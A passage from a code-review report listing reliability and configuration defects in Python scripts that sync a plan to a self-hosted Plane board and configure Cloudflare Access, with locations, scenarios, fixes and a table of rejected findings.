**Scenario:** Deterministic (not nondeterministic) last-write-wins fixed by JSON op order — UPD (index 2) applies after NEW-12 (index 1), so UPD wins. Concrete data loss: NEW-12's `gate:security` label and its "Durable home for D3 / hash-chained gate_audit_log" description are overwritten by UPD's narrower `[phase:0,type:wiring]` labels and "True-up AC#4" description. A declared **create** silently became an **update** (`.apply_log.json` shows both actions as `update` of the same id; NEW-12 absent from the 13 create entries).
**Fix:** Honor `op['op']` — a declared create that resolves to an existing item should error or use a distinct `external_id`, not silently PATCH. De-dup ops by resolved target id within a run; merge bodies or fail loudly on collision instead of two PATCHes to one id.

### NS-04 [P2] — Unguarded PATCH/POST aborts mid-run AND `.apply_log.json` never written on failure
**Where:** `apply_upsert_plan.py:165` (label POST `['id']`), `:199` (PATCH), `:213` (create POST `['id']`), `:221` (LOG written only after the loop)
**Scenario:** Any per-op `RuntimeError` (or `None['id']` from an empty body) aborts the loop before `LOG_F.write_text`, leaving partial board mutation with **no audit artifact** of what landed. (Soften "safe re-run impossible" → "no audit trail of what landed": the `if ext in by_ext` skip at `:205` + fresh live re-index make re-runs largely idempotent.)
**Fix:** Wrap each op's mutating calls in try/except, append per-op success/error to `log['actions']`, and write/flush `LOG_F` incrementally or in a `finally:` so the log always reflects what was actually applied even on abort.

### NS-05 [P1] — `apply_upsert_plan` silently drops `priority` (39/39) and `acceptance_criteria` (39/39)
**Where:** `apply_upsert_plan.py:186-191` (body only ever gets description_html/state/labels)
**Scenario:** Every op carries `priority` and `acceptance_criteria`; neither reaches the board. The proof criteria never land.
**Fix:** Reuse the canonical `PRIORITY_BY_LABEL` from `apply_delta.py:54` (blocking→urgent, high→high, normal→medium) and set `body['priority']` to match the existing convention — do **not** use the "append to labels" fallback. Render `op['acceptance_criteria']` into `description_html` (append a `<ul>` of AC items) since the plan descriptions don't contain them. Applies to both update (25) and create (14) paths.

### NS-06 [P1] — `setup_cf_access` rebuilds policies as a full REPLACE from the apps-LIST → can drop the human "Owner only" policy
**Where:** `setup_cf_access.py:86-94` (`cur_pol` from `GET /access/apps?per_page=50`), `:132-146` (PUT app with policies rebuilt from `cur_pol`)
**Scenario:** Conditional (latent landmine, not every-run): fires only when the apps LIST returns this app **without** an embedded `policies` array (or with reusable policies stripped). On that response, `cur_pol = []`, and the PUT replaces the app's policy list — **silently dropping the human Owner-only policy** (breaking human SSO to the board), with abort only on `success==false` (no read-back).
**Fix:** Read the authoritative per-app policies (`GET .../access/apps/{app_id}/policies`) and assert non-empty before the PUT. **Better:** use the additive endpoint `POST .../access/apps/{app_id}/policies` to attach the service policy **without** touching the human policy. **Defense-in-depth:** after any mutation, re-GET policies and verify the human policy id is still present, aborting loudly if not.

### NS-07 [P1] — `setup_cf_access` PUT body omits the required self-hosted `domain` field
**Where:** `setup_cf_access.py:134-145` (body has type/session_duration/destinations/self_hosted_domains/… but no `domain`; `:89` shows `domain` IS on the read-back object, never copied into the PUT)
**Scenario:** Most-likely outcome (Scenario A): CF validates `domain` as required → 400 → `sys.exit("attach failed: …")` at `:148`; the durable attach never completes and the operator falls back to the dashboard — exactly the failure the script exists to eliminate. Worst case (Scenario B, lower probability): PUT accepted, `domain` silently blanked, breaking human SSO + automation. Either way the script's sole load-bearing job is broken → P1. Compounds with NS-06 on the same attach step. Note `self_hosted_domains` is deprecated (CF sunset 2025-11-21).
**Fix:** Copy `domain` (and any other server-returned required fields) from the read-back app into the PUT body. **Prefer** a round-trip that PUTs back the full app object with only the `policies` field mutated (auto-preserves domain + other required fields, avoids brittle field-by-field reconstruction).

### NS-08 [P1] — `setup_cf_access` verify step is dead: wrong env-var names, no `.env` loading
**Where:** `setup_cf_access.py:153-156` (reads `PLANE_CF_CLIENT_ID`/`PLANE_CF_CLIENT_SECRET`; no `_load_dotenv` anywhere)
**Scenario:** The verify branch reads names that don't exist in `.env` (it should read `CF_ACCESS_CLIENT_ID`/`CF_ACCESS_CLIENT_SECRET`), and no `_load_dotenv` means even correct names wouldn't resolve unless manually exported. The docstring (`:29`) advertises the same broken names, so an operator who follows it is misled too. `print("DONE.")` at `:168` runs regardless, reporting success though verify was skipped.
**Fix:** Add `_load_dotenv(HERE/'.env')` like the siblings (`plane_preflight.py:38`, `apply_upsert_plan.py:46`) and read `CF_ACCESS_CLIENT_ID`/`CF_ACCESS_CLIENT_SECRET` (accept `PLANE_CF_*` as fallback). Fix the docstring name at `:29`.

### NS-09 [P1] — `plane_preflight` CF-meta-decode branch unreachable; crashes on the exact deny it diagnoses
**Where:** `plane_preflight.py:71-94` (`urlopen` with default opener; the `if e.code in (301,302)` branch + `_decode_meta`)
**Scenario:** `urlopen` uses the default opener (with `HTTPRedirectHandler`), so a CF 302→login is auto-followed to a 200 HTML page; `json.loads(r.read())` at `:74` then raises `JSONDecodeError` (a `ValueError`), which neither `except HTTPError` (`:78`) nor `except URLError` (`:95`) catches → uncaught traceback, exit 1. The meta-decode branch (`:82-93`) is therefore dead for the normal CF deny path. The crash is general: **any** 200 with a non-JSON body crashes at `:74`.
**Fix:** Build a custom opener whose `HTTPRedirectHandler.redirect_request` returns `None` (so 301/302 surface as `HTTPError` and the existing meta-decode branch runs), **AND** wrap `json.loads` in try/except (or check `r.geturl()` for `cloudflareaccess.com` / a non-JSON Content-Type) to route a non-JSON 200 to `fix()` with the CF-deny diagnosis. Both fixes are needed.

### NS-10 [P2] — `apply_upsert_plan` resolve() regex fallback can substring-mis-target
**Where:** `apply_upsert_plan.py:143-147` (`tok = re.search(r'ASCP-E\d+-\w+', …)`; then `if tok.group(0) in (e or '')`)
**Scenario:** Verified: `'ASCP-E7-REQ1' in 'story:ASCP-E7-REQ11'` == True. Trigger surface is wide — the regex reads the token from `match_key + " " + target_name`, so any op whose `target_name` embeds a token reaches the fallback even when `match_key` is None (13/39 ops) or lacks the `story:` prefix. The board also carries `task:` external_ids, which an unanchored `in` could wrongly match. Latent today (only plan E7 key is `story:ASCP-E7-REQ16`, resolved by exact `_variants`).
**Fix:** Anchor the comparison AND constrain the namespace — require `cand == "story:" + token` (exact-segment), only consider `story:`-prefixed candidates for a story op, never resolve a story op to a `task:` external_id. **Better:** drop the fuzzy substring branch entirely (every current key resolves exactly via `_variants`) and emit an explicit unresolved-op report.

### NS-11 [P2] — `assign()` swallows errors as warnings; `None['id']` crash if a POST returns empty body
**Where:** `apply_upsert_plan.py:165` (label `['id']`), `:170-180` (`assign` except → print warn), `:213` (create `['id']`), `:219-221` (summary/log)
**Scenario:** `assign()` failures print to stdout (`:180`) but are **absent from both durable artifacts** — `.apply_log.json` shows a clean `update`/`create` while the item is in fact not linked to its epic-module/phase-cycle; the summary count omits them. Separately, `_api(...)["id"]` on the two create POSTs crashes with `TypeError` if a POST returns an empty body (`:79` returns `None`).
**Fix:** Record `assign()` outcomes into `log['actions']` and add a nonzero assign-failure count to the summary. Guard both POST `['id']` subscripts: `r = _api(...); if not r or "id" not in r: <log+skip/raise-with-context>`.

---

## 7. Rejected (false positives / mis-calibrated)

| ID | Claim | Why rejected |
|---|---|---|
| **COR-06** | `next_item()` KeyError on missing `id`, mis-orders on missing `sequence_id`, dead code | Mostly false. (1) Plane's work-items LIST always returns `id`; real 256-item snapshot has 256/256 ids — no realistic KeyError. (2) Code already uses `.get("sequence_id", 0)`; all 256 items have sequential non-null seqs; `sequence_id` is only the tiebreaker behind `ACTIONABLE_ORDER.index`. (3) Only the dead loop (`for name,_g,_m in []: pass`) is real — cosmetic hygiene, not a crash/correctness defect. |
| **REL-01 (rel)** | `_seen`/`_save_seen` not thread-safe under ThreadingHTTPServer | Duplicate of the kept COR-05/SEC-06 finding (consolidated). |
| **REL-03 (rel)** | No User-Agent → CF 1010 hard-fail against remote | Agent path targets **local** plain-HTTP Plane (no Cloudflare); the live-failure premise is false today. Kept as the latent REL-05 instead. |
| **REL-04 (rel)** | `_items()` per_page=100 truncates a 243-item board to 100 | Not reproduced as a live truncation defect on the verified board/code path. |
| **REL-05 (rel)** | `apply_upsert_plan` not crash-safe (log only at end) | Folded into the kept NS-04 (same mechanism, scoped to audit-trail loss not corruption). |
| **REL-06 (rel)** | `enqueue()` no error handling, runs after 200 OK → silent job loss | Not a confirmed live defect; the queue currently has no consumer (REL-01 integration-contract supersedes). |
| **SEC-05** | Trusted write path missing CF/UA headers (fix applied only to throwaway tooling) | **False premise.** `plane_client` loads `plane-selfhost/credentials.env` → `localhost:8090`, a local Docker Plane with **no Cloudflare**; default urllib UA triggers no 1010, no Access 302. The session added CF/UA exactly to the `.env`-based callers that reach the CF-fronted remote board. Split is intentional + documented (`REMOTE_ACCESS.md:6-9`). The header gap on `plane_client` is the *latent* CFG-03/REL-05, not a live security defect. |
| **CFG-05** | reorg resolves logical keys against remote external_id index; silent drops on prefix drift | **Mechanism doesn't exist.** `reorg_plane.py:26` binds `ISSUES = PROV["issues"]` (local file) and does strict `f"story:{s['key']}" in ISSUES` — no remote external_id resolution anywhere. Board `external_id` IS the provision logical key by construction (`provision_plane.py:184,216`). All 49/49 stories + 186/186 tasks resolve; replaying E1-E8 yields 243/243 with zero drops. |
| **CFG-06** | Self-host webhook sends `state` as bare UUID; only cloud sends `state.name` | **False premise.** Single OSS codebase for cloud+self-host. The webhook `issue` event is serialized by `IssueExpandSerializer` with `state = StateLiteSerializer` (`fields=["id","name","color","group"]`) — `data.state` is a nested object with `name` on **both** cloud and self-host (verified on main and v0.28.0). Handler's dict branch (`:84`) extracts the name correctly. The reviewer conflated the webhook serializer with the REST LIST endpoint (which *does* return bare UUID). |
| **CFG-07** | Live secrets committed in plaintext `.env` → land in git history | **Fully mitigated.** `.env` is gitignored (`.gitignore:45` explicit + broad `.env`/`.env.*`), not tracked (`git ls-files` empty, `!!` ignored class), never committed (`git log --all`, `-S <secret>`, full blob scan all empty). `.apply_log.json` likewise ignored (`:46`). No hardcoded secrets in tracked source. Only residual is plaintext on local disk vs a keychain — generic dev hygiene (downgraded to P2 informational), not the committed-breach the claim describes. |

---

## 8. References to enrich next
- Confirm Plane's exact webhook `activity` payload shape on the **self-host version actually deployed** (for the COR-03/REL-07 `activity.field=='state'` gate) — verified against makeplane main + v0.28.0; pin to the deployed tag.
- Cross-check `tools/evidence_collector.validate_evidence_record` signature when wiring REL-03 fix (referenced at `tools/evidence_collector.py:99-114`).
- Cloudflare Access Application object schema for the NS-07 `domain` requirement against the account's API version.
